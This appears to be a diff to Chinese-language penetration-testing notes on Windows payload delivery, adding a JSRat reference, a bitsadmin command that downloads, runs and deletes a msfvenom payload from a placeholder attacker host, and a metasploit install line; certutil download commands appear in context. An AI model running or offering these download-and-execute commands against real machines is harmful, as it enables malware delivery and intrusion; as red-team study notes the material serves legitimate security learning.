@@ -32,6 +32,10 @@ JScript参考链接：http://www.yuanma.net/Manual/JavaScript/
 
 https://evi1cg.me/archives/Run_JSRAT.html
 
+https://github.com/Ridter/MyJSRat
+
+通过访问wtf来获取payload, 最后是通过rundll32来执行的payload，不需要使用powershell
+
 #### 5. Mshta ####
 
 HTA（HTML Application)，可以嵌入`JScript`和`VBScript`，后缀名为`.hta`时可以直接运行，使用命令行`mshta`时，后缀可以使用`htm`,`xml`. 执行时带上绝对路径方可运行，否则无效。
@@ -144,3 +148,16 @@ windows 文件下载
 
 	certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 1.exe
 	certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
+
+#### 10.bitsadmin
+
+	cmd.exe /c bitsadmin /transfer d90f http://vps/a %APPDATA%d90f.exe&%APPDATA%d90f.exe&del %APPDATA%d90f.exe
+
+http://vps/a 为通过msfvenom生成payload
+
+
+#### MISC
+
+install metasploit：
+
+	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
